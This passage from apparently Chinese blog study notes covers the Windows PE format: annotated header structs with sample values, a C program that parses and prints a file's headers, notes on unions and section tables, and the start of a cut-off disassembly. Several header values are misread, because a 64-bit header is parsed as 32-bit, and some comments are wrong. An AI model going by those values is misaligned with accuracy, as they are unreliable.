 WORD   e_ss;  <span class=\"number\">0000</span>                      <span class=\"comment\">// Initial (relative) SS value</span></span><br><span class=\"line\">    WORD   e_sp;  <span class=\"number\">00B</span>8                      <span class=\"comment\">// Initial SP value</span></span><br><span class=\"line\">    WORD   e_csum;  <span class=\"number\">0000</span>                     <span class=\"comment\">// Checksum</span></span><br><span class=\"line\">    WORD   e_ip;    <span class=\"number\">0000</span>                     <span class=\"comment\">// Initial IP value</span></span><br><span class=\"line\">    WORD   e_cs;    <span class=\"number\">0000</span>                    <span class=\"comment\">// Initial (relative) CS value</span></span><br><span class=\"line\">    WORD   e_lfarlc;     <span class=\"number\">0040</span>                <span class=\"comment\">// File address of relocation table</span></span><br><span class=\"line\">    WORD   e_ovno;       <span class=\"number\">0000</span>               <span class=\"comment\">// Overlay number</span></span><br><span class=\"line\">    WORD   e_res[<span class=\"number\">4</span>];     <span class=\"number\">0000</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span>               <span class=\"comment\">// Reserved words</span></span><br><span class=\"line\">    WORD   e_oemid;      <span class=\"number\">0000</span>               <span class=\"comment\">// OEM identifier (for e_oeminfo)</span></span><br><span class=\"line\">    WORD   e_oeminfo;    <span class=\"number\">0000</span>               <span class=\"comment\">// OEM information; e_oemid specific</span></span><br><span class=\"line\">    WORD   e_res2[<span class=\"number\">10</span>];   <span class=\"number\">0000</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span>               <span class=\"comment\">// Reserved words</span></span><br><span class=\"line\">    DWORD  e_lfanew;     <span class=\"number\">0000</span> <span class=\"number\">00F</span>8               <span class=\"comment\">// File address of new exe header PE头相对于文件的偏移，定位PE文件</span></span><br><span class=\"line\">&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br><span class=\"line\"><span class=\"comment\">//0x40</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class=\"line\">    DWORD Signature;    <span class=\"number\">00004550</span></span><br><span class=\"line\">    IMAGE_FILE_HEADER FileHeader;</span><br><span class=\"line\">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class=\"line\">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br><span class=\"line\"><span class=\"comment\">//E0+14+4=0xF8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class=\"line\">    WORD    Machine;        <span class=\"number\">8664</span>   <span class=\"comment\">//程序运行的CPU型号，0x0任何处理器，0x14 386及后续处理器</span></span><br><span class=\"line\">    WORD    NumberOfSections;    <span class=\"number\">0007</span>   <span class=\"comment\">//文件中节的总数，要新增或者合并节，修改值</span></span><br><span class=\"line\">    DWORD   TimeDateStamp;     AC6AAA87   <span class=\"comment\">//时间戳：文件创建时间，编译器填写</span></span><br><span class=\"line\">    DWORD   PointerToSymbolTable; <span class=\"number\">00000000</span>  </span><br><span class=\"line\">    DWORD   NumberOfSymbols;   <span class=\"number\">00000000</span></span><br><span class=\"line\">    WORD    SizeOfOptionalHeader;   <span class=\"number\">00F</span>0   <span class=\"comment\">//可选PE投大小，32位默认E0H，64位默认F0，大小可以自定义</span></span><br><span class=\"line\">    WORD    Characteristics;     <span class=\"number\">0022</span>      <span class=\"comment\">//可执行文件尾10F</span></span><br><span class=\"line\">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br><span class=\"line\"><span class=\"comment\">//0x14</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class=\"line\">    WORD    Magic;\t\t <span class=\"number\">020B</span>     <span class=\"comment\">//10B32位下PE   20B64位下pe</span></span><br><span class=\"line\">    BYTE    MajorLinkerVersion; <span class=\"number\">0</span>E</span><br><span class=\"line\">    BYTE    MinorLinkerVersion; <span class=\"number\">14</span></span><br><span class=\"line\">    DWORD   SizeOfCode;  <span class=\"number\">00023400</span>     <span class=\"comment\">//所有代码节的和，必须是FileAlignment的整数倍，编译器填的没用</span></span><br><span class=\"line\">    DWORD   SizeOfInitializedData;  <span class=\"number\">00079400</span>    <span class=\"comment\">//已初始化数据大小的和必须是FileAlignment的整数倍，编译器填的没用</span></span><br><span class=\"line\">    DWORD   SizeOfUninitializedData; <span class=\"number\">00000000</span>   <span class=\"comment\">//未初始化数据大小的和必须是FileAlignment的整数倍，编译器填的没用</span></span><br><span class=\"line\">    DWORD   AddressOfEntryPoint;   <span class=\"number\">00023520</span>     <span class=\"comment\">//程序入口</span></span><br><span class=\"line\">    DWORD   BaseOfCode;\t\t\t<span class=\"number\">00001000</span>\t\t<span class=\"comment\">//代码开始的基址</span></span><br><span class=\"line\">    DWORD   BaseOfData;\t\t\t<span class=\"number\">40000000</span>\t\t<span class=\"comment\">//数据开始的基址</span></span><br><span class=\"line\">    DWORD   ImageBase;\t\t\t<span class=\"number\">00000100</span>\t\t<span class=\"comment\">//内存镜像地址</span></span><br><span class=\"line\">    DWORD   SectionAlignment;\t<span class=\"number\">00001000</span>        <span class=\"comment\">//内存对齐</span></span><br><span class=\"line\">    DWORD   FileAlignment;\t\t<span class=\"number\">00000002</span>        <span class=\"comment\">//文件对齐</span></span><br><span class=\"line\">    WORD    MajorOperatingSystemVersion;\t<span class=\"number\">000</span>A\t\t</span><br><span class=\"line\">    WORD    MinorOperatingSystemVersion;    <span class=\"number\">0000</span></span><br><span class=\"line\">    WORD    MajorImageVersion;\t\t\t\t<span class=\"number\">000</span>A</span><br><span class=\"line\">    WORD    MinorImageVersion;\t\t\t\t<span class=\"number\">0000</span></span><br><span class=\"line\">    WORD    MajorSubsystemVersion;\t\t\t<span class=\"number\">000</span>A</span><br><span class=\"line\">    WORD    MinorSubsystemVersion;\t\t\t<span class=\"number\">0000</span></span><br><span class=\"line\">    DWORD   Win32VersionValue;\t\t\t\t<span class=\"number\">00000000</span></span><br><span class=\"line\">    DWORD   SizeOfImage;\t\t\t\t\t<span class=\"number\">000</span>A2000    <span class=\"comment\">//内存中整个PE文件的映射的尺寸，必须是FileAlignment的整数倍</span></span><br><span class=\"line\">    DWORD   SizeOfHeaders;\t\t\t\t\t<span class=\"number\">00000400</span>    <span class=\"comment\">//所有头+节表按照文件对齐后的大小</span></span><br><span class=\"line\">    DWORD   CheckSum;\t\t\t\t\t\t<span class=\"number\">0005</span>D8CD</span><br><span class=\"line\">    WORD    Subsystem;\t\t\t\t\t\t<span class=\"number\">0020</span></span><br><span class=\"line\">    WORD    DllCharacteristics;\t\t\t\tC160</span><br><span class=\"line\">    DWORD   SizeOfStackReserve;\t\t\t\t<span class=\"number\">00080000</span>\t<span class=\"comment\">//初始化时保留的堆栈大小</span></span><br><span class=\"line\">    DWORD   SizeOfStackCommit;\t\t\t\t<span class=\"number\">00000000</span></span><br><span class=\"line\">    DWORD   SizeOfHeapReserve;\t\t\t\t<span class=\"number\">00004000</span></span><br><span class=\"line\">    DWORD   SizeOfHeapCommit;\t\t\t\t<span class=\"number\">00000000</span></span><br><span class=\"line\">    DWORD   LoaderFlags;\t\t\t\t\t<span class=\"number\">00100000</span>\t</span><br><span class=\"line\">    DWORD   NumberOfRvaAndSizes;\t\t\t<span class=\"number\">00000000</span>\t<span class=\"comment\">//目录项目数</span></span><br><span class=\"line\">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class=\"line\">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br><span class=\"line\"><span class=\"comment\">//0xE0</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230203150643470.png\" alt=\"image-20230203150643470\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230204150314850.png\" alt=\"image-20230204150314850\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdlib.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;malloc.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> FILEPATH <span class=\"string\">&quot;C:\\\\Users\\\\shinya\\\\Desktop\\\\Unpacker.exe&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">LPVOID <span class=\"title function_\">ReadPELoader</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> len = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tFILE *fp = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tLPVOID pFileBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfp = fopen(FILEPATH, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (fp == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;fp = NULL&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfseek(fp, <span class=\"number\">0</span>, SEEK_END);</span><br><span class=\"line\"></span><br><span class=\"line\">\tlen = ftell(fp);</span><br><span class=\"line\"></span><br><span class=\"line\">\tfseek(fp, <span class=\"number\">0</span>, SEEK_SET);</span><br><span class=\"line\"></span><br><span class=\"line\">\tpFileBuffer = <span class=\"built_in\">malloc</span>(len);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!pFileBuffer)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;ptr = NULL&quot;</span>);</span><br><span class=\"line\">\t\tfclose(fp);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">size_t</span> reader = fread(pFileBuffer, len, <span class=\"number\">1</span>, fp);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!reader)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;reader= 0&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(pFileBuffer);</span><br><span class=\"line\">\t\tpFileBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t\tfclose(fp);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>, pFileBuffer);</span><br><span class=\"line\">\tfclose(fp);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> pFileBuffer;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">PrintNTHeader</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tLPVOID pFileBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pPEHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpFileBuffer = ReadPELoader();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!pFileBuffer)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;文件读取失败&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;不是有效mz标识&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(pFileBuffer);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;MZ标志:%X\\n&quot;</span>, pDosHeader-&gt;e_magic);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;PE偏移:%X\\n&quot;</span>, pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//判断是否是有效的PE标志</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (*((PDWORD)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew)) != IMAGE_NT_SIGNATURE)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;不是有效的PE标志\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(pFileBuffer);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//打印NT头</span></span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;NT:%X\\n&quot;</span>, pNTHeader-&gt;Signature);</span><br><span class=\"line\">\tpPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + <span class=\"number\">4</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;PE:%X\\n&quot;</span>, pPEHeader-&gt;Machine);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;节的数量:%X\\n&quot;</span>, pPEHeader-&gt;NumberOfSections);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;SizeOfOptionalHeader:%X\\n&quot;</span>, pPEHeader-&gt;SizeOfOptionalHeader);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//可选PE头</span></span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional_PE:%X\\n&quot;</span>, pOptionHeader-&gt;Magic);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(pFileBuffer);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tPrintNTHeader();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">union Test     //类型</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar x;</span><br><span class=\"line\">\tint y;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">取成员变量中最大的</span><br><span class=\"line\"></span><br><span class=\"line\">1、联合体的成员是共享内存空间的中</span><br><span class=\"line\">2、联合体的内存空间大小是联合体成员中对内存空间大小要求最大的空间大小</span><br><span class=\"line\">3、联合体最多只有一个成员有效</span><br><span class=\"line\"></span><br><span class=\"line\">Test test;</span><br><span class=\"line\">test.y = 0x12345678;</span><br><span class=\"line\">printf(&quot;%X\\n&quot;,test.x);\t//0x78</span><br><span class=\"line\">printf(&quot;%X\\n&quot;,test.y);  //0x12345678</span><br><span class=\"line\"></span><br><span class=\"line\">union</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar x;</span><br><span class=\"line\">\tint y;</span><br><span class=\"line\">&#125;Testhaha;      //变量</span><br><span class=\"line\">Testhaha.x = 1;</span><br><span class=\"line\"></span><br><span class=\"line\">结构体也可以这么写</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"节表\"><a class=\"markdownIt-Anchor\" href=\"#节表\">#</a> 节表</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typedef struct _IMAGE_SECTION_HEADER &#123;</span><br><span class=\"line\">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];// 节表名称,如“.text” ,如果不是以\\0结尾，系统会截取8个字节长度处理</span><br><span class=\"line\">  //IMAGE_SIZEOF_SHORT_NAME=8</span><br><span class=\"line\">    union &#123;</span><br><span class=\"line\">      //　共用体，也叫联合体，在一个“联合”内可以定义多种不同的数据类型， </span><br><span class=\"line\">//一个被说明为该“联合”类型的变量中，允许装入该“联合”所定义的任何一种数据，这些数据共享同一段内存，</span><br><span class=\"line\">//以达到节省空间的目的。union变量所占用的内存长度等于最长的成员的内存长度。</span><br><span class=\"line\">            DWORD   PhysicalAddress; //当前节的名称 ， 占8字节</span><br><span class=\"line\">            DWORD   VirtualSize; //内存中文件对齐大小</span><br><span class=\"line\">    &#125; Misc;   //没有对齐前的真实尺寸，可以不准确，misc可以大于sizeofrawdata</span><br><span class=\"line\">    DWORD   VirtualAddress; //在内存中的偏移地址 +imageOfBase=真正的位置</span><br><span class=\"line\">    DWORD   SizeOfRawData; //当前节在文件中对齐后的大小 也就是节点的大小 [内存和文件中是一样的]</span><br><span class=\"line\">    DWORD   PointerToRawData; //当前节在文件中的偏移 也就是文件的开始位置</span><br><span class=\"line\">    DWORD   PointerToRelocations; // 调试相关</span><br><span class=\"line\">    DWORD   PointerToLinenumbers;// 调试相关</span><br><span class=\"line\">    WORD    NumberOfRelocations;// 调试相关</span><br><span class=\"line\">    WORD    NumberOfLinenumbers;// 调试相关</span><br><span class=\"line\">    DWORD   Characteristics; //文件属性，比如该节数据属性是否为可执行属性，都在这里面</span><br><span class=\"line\">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230205140709262.png\" alt=\"image-20230205140709262\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230205140950190.png\" alt=\"image-20230205140950190\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230205143439207.png\" alt=\"image-20230205143439207\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DOS头 00h-40h</span><br><span class=\"line\">40H-F7 垃圾数据</span><br><span class=\"line\">F8-FB signature</span><br><span class=\"line\">FC-10F 标准PE头 NumberOfSection = 7  sizeofoptionalheader = 0xF0</span><br><span class=\"line\">110H-1FF 可选PE头</span><br><span class=\"line\">200-227 节表1 .text   025E00  400</span><br><span class=\"line\">228-24F 节表2 .rdata  9A00    26200</span><br><span class=\"line\">250-277 节表3 .data   0E00    2FC00</span><br><span class=\"line\">278-29F 节表4 .pdata  1200    30A00</span><br><span class=\"line\">2A0-2C7 节表5 .didat  0200    31C00  </span><br><span class=\"line\">2C8-2ef 节表6 .rsrc   0C00    31E00</span><br><span class=\"line\">2f0-317 节表7 .reloc  0400    32A00</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FileBuffer -&gt; ImageBuffer</span><br><span class=\"line\">1.分配sizeofimage内存</span><br><span class=\"line\"></span><br><span class=\"line\">2.复制sizeofheaders，对齐</span><br><span class=\"line\"></span><br><span class=\"line\">3.循环复制节，从pintertorawdata开始，复制sizeofrawdata大小</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230206140901033.png\" alt=\"image-20230206140901033\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7650FD1E &gt;  8BFF            mov     